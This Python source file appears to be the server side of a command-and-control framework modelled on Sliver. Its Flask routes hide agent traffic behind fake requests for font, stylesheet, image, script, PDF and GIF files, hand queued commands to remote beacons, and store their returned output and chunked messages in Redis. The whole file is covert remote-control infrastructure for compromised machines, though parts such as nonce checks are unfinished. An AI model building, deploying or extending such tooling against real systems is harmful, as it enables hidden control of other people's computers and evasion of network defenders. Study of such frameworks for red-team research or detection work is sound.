from time import time, sleep
from flask import Flask, render_template, request, jsonify
import base64
import redis
import command
import os

# TODO Make it such that the redis logs clear after a bit, make a flag that can be set when the domain is created as well

# NOTE: Inspired by sliver and how they utilize different file extensions and endpoints to configure different commands, we do the same here. Below is our structure


class FlaskApplication:
    """
    Programmatic Flask application class that creates domain-specific Flask apps
    Each instance handles a specific domain with its own template folder and configuration
    """

    # TODO: In the future make it such that the user s a ble to select the endpoints that they want to use, specifclaly the file extensions

    def __init__(
        self,
        domain,
        redis_client=redis.Redis(),
        template_folder=None,
        polling_timer: int = 10,
    ):
        self.domain = domain
        self.redis_client = redis_client
        self.template_folder = template_folder or f"../templates/{self.domain}"

        self.app = self._create_app()
        # The max amount of time a long polling connection timer is held open
        self.polling_timer = polling_timer
        self._setup_routes()

    def _create_app(self):
        """Create Flask app instance with domain-specific template folder"""

        # Create template folder if it doesn't exist
        os.makedirs(self.template_folder, exist_ok=True)

        app = Flask(__name__, template_folder=self.template_folder)

        # Create a basic index.html inside of the folder if it does not exist
        index_file_path = os.path.join(self.template_folder, "index.html")

        if not os.path.exists(index_file_path):
            self._create_index_html(index_file_path)

        # Domain-specific configuration
        app.config.update(
            {
                "DOMAIN": self.domain,
                "SECRET_KEY": f"{self.domain}-secret-key",
                "DEBUG": True,
            }
        )

        return app

    def _setup_routes(self):
        """Setup all routes for the Flask application"""

        # NOTE: Inspired by sliver and how they utilize different file extensions and endpoints to configure different commands, we do the same here. Below is our structure

        @self.app.route("/", methods=["GET"])
        def home():
            return render_template("index.html", domain=self.domain)

        @self.app.route("/<path:filename>.woff", methods=["GET"])
        def handle_beacon_command_request(filename):
            """Obtains any commands that have been queued"""
            # TODO: Provide a dictionary of valid c ommands that can only be utilized or injected?
            # TODO: Checking of the nonce is going to have to be provided here, we assume that a woff request is only for obtaining beacon messages. Results sent with a different file

            commands = command.get_queued_commands(self.domain, self.redis_client)

            if commands:
                # Decode bytes to strings if needed
                decoded_commands = [
                    cmd.decode("utf-8") if isinstance(cmd, bytes) else cmd
                    for cmd in commands
                ]
                return (
                    jsonify(
                        {
                            "commands": decoded_commands,
                        }
                    ),
                    200,
                )

            else:
                # TODO: IN the future this can implement a timer of shorts that is sent back
                return jsonify(status="No data available"), 404

        @self.app.route("/<path:filename>.css", methods=["POST"])
        def handle_beacon_command_results(filename):
            """Used as the endpoint for beacon response messages, including the outputs of commands"""
            # TODO: Verify the nonce of the endpoint/obfuscation/encryption

            data = request.get_json()
            results = data.get("results")
            commands = data.get("commands")

            # Ensure that results is a list and not another python iterable (string)
            if not isinstance(results, list):
                return jsonify(error="Results must be a list"), 400
            if not isinstance(commands, list):
                return jsonify(error="Commands must be a list"), 400

            if results and commands:
                self._redis_push_results(results, commands, f"{self.domain}:results")
                return jsonify(status="received"), 200
            else:
                return jsonify(
                    status="no results or commands provided",
                )

        @self.app.route("/<path:filename>.png", methods=["GET"])
        def handle_long_poll_command_request(filename):
            """Used as the endpoint for longpolling commands, holds the connection open until commands are received for a set timer"""

            # If there are commands immediately available, send htem
            commands = command.get_queued_commands(self.domain, self.redis_client)

            time_spent = 0
            while not commands and time_spent < self.polling_timer:
                # Check every 0.1 seconds
                commands = command.get_queued_commands(self.domain, self.redis_client)
                time_spent += 0.1
                # Set the sleep operation
                sleep(0.1)
            # FIXME: I think that there is a the possibility for a race condition here. In that if the user inputs multiple commands, get_queued_commands validates to
            # True before all of them are inputted into the redis stream, as result only one or two are returned

            # If commands were found we immiedately return
            if commands:
                # Decode bytes to strings if needed
                decoded_commands = [
                    cmd.decode("utf-8") if isinstance(cmd, bytes) else cmd
                    for cmd in commands
                ]
                return (
                    jsonify(
                        {
                            "commands": decoded_commands,
                        }
                    ),
                    200,
                )
            # Otherwise send a failed reponse
            return jsonify(status="No results or commands provided"), 404

        @self.app.route("/<path:filename>.js", methods=["POST"])
        def handle_long_poll_command_return(filename):
            """Used as the enpoint to get results back from longpolling commands"""

            data = request.get_json()
            results = data.get("results")
            commands = data.get("commands")

            # Ensure that results is a list and not another python iterable (string)
            if not isinstance(results, list):
                return jsonify(error="Results must be a list"), 400
            if not isinstance(commands, list):
                return jsonify(error="Commands must be a list"), 400

            if results and commands:
                self._redis_push_results(results, commands, f"{self.domain}:results")
                return jsonify(status="received"), 200
            else:
                return jsonify(status="no results or commands provided"), 404

        # TODO: Key exchange route and endpoint

        @self.app.route("/<path:filename>.pdf", methods=["GET"])
        def handle_agent_modification_command_request(filename):
            # Get agent modification commands if they are available
            commands = command.get_queued_agent_modification_commands(
                self.domain, self.redis_client
            )

            if commands:
                # Decode bytes to strings if needed
                decoded_commands = [
                    cmd.decode("utf-8") if isinstance(cmd, bytes) else cmd
                    for cmd in commands
                ]
                return (
                    jsonify(
                        {
                            "commands": decoded_commands,
                        }
                    ),
                    200,
                )

            else:
                # TODO: IN the future this can implement a timer of shorts that is sent back
                return jsonify(status="No data available"), 404

        @self.app.route("/<path:filename>.gif", methods=["POST"])
        def handle_anent_modificatn_command_results(filename):
            """Used as the endpoint for beacon response messages, including the outputs of commands"""
            # TODO: Verify the nonce of the endpoint/obfuscation/encryption

            data = request.get_json()
            results = data.get("results")
            commands = data.get("commands")

            # Ensure that results is a list and not another python iterable (string)
            if not isinstance(results, list):
                return jsonify(error="Results must be a list"), 400
            if not isinstance(commands, list):
                return jsonify(error="Commands must be a list"), 400

            if results and commands:
                self._redis_push_results(
                    results, commands, f"{self.domain}:mod_results"
                )
                return jsonify(status="received"), 200
            else:
                return jsonify(
                    status="no results or commands provided",
                )

    def generate_nonce(self):
        """
        Generates a nonce value to be utilized with an agent, nonce value
        """

    def _redis_push_results(self, results, commands, stream_key):
        """
        Pushes results and commands for both the execution commands and the agent modification commands.
            -stream_key is the respective redis stream that these commands should be passed into
        """
        try:
            for i in range(len(results)):
                self.redis_client.xadd(
                    stream_key,
                    {
                        "ts": time(),
                        "domain": self.domain,
                        "command": commands[i],
                        # NOTE: THE RESULTS MUST BE STRIPPED OF ANY NEWLINE CHARACTERS, I don't know if this applies for a real redis instance and server,
                        # HOwever during testing for the fake redis, it was literally breaking with a newline character being inputted
                        "result": results[i].strip(),
                    },
                )
        except Exception as e:
            print(f"Error: {e}")

    def _redis_stream_push(self, data):
        """
        Function that takes chinks from messages sent by the host, reassmebling if it is the final chunk

        """

        # Load in the data from the chunks
        message_id = data.get("message_id")
        agent_id = data.get("agent_id")
        chunk_size = data.get("chunk_size")
        chunk_index = data.get("chunk_index")
        chunk_count = data.get("chunk_count")
        chunk_data = data.get("chunk_data")

        print(f"[{self.domain}] Chunk {chunk_index}/{chunk_count}")

        # Store the chunk in the redis buffer with domain-specific key
        # This ensures data isolation between domains
        list_key = f"chunks:{self.domain}:{agent_id}:{message_id}"

        # Push the current chunk at the end of the list
        self.redis_client.rpush(list_key, chunk_data)

        # Set the time to live of each of the keys (in seconds)
        self.redis_client.expire(list_key, 600)

        # Check to see if the current chunk_count = chunk_size.
        # Subtract by 1 as the chunk index starts at 0
        if chunk_index == chunk_count - 1:
            print(f"[{self.domain}] Reassembling message...")
            # We have everything to reassemble so pass in the list key
            result = self._reassemble(list_key)

            # Publish the reassembled message to Redis stream
            stream_key = f"{self.domain}"
            result_str = (
                result.decode("utf-8") if isinstance(result, bytes) else str(result)
            )
            self.redis_client.xadd(
                stream_key,
                {"ts": time(), "domain": self.domain, "message": result_str},
            )

            # Also publish the message to the all stream
            self.redis_client.xadd(
                "all", {"ts": time(), "domain": self.domain, "message": result_str}
            )

    def _reassemble(self, list_key):
        """
        Function that reassembles chunks that are stored
        in a redis hash into a full message
        once all chunks have been sent
        """
        parts = self.redis_client.lrange(list_key, 0, -1)
        # Combine all the parts
        message = b"".join(parts)  # type: ignore
        return base64.b64decode(message)

    def _create_index_html(self, index_file_path):
        """
        Function that creates a simple index.html page if it does not already exist for an application
        """

        if not os.path.exists(index_file_path):
            basic_html = f"""
        <html>
            <body>
                <h1>{{{{ domain }}}} - Flask Application</h1>
                <p>This is the domain-specific template for: <strong>{self.domain}</strong></p>
                <p>Generated automatically for {self.domain}</p>
            </body>
        </html>"""
            with open(index_file_path, "w") as f:
                f.write(basic_html)

    def get_app(self):
        """Return the Flask app instance for use with WSGI servers"""
        return self.app
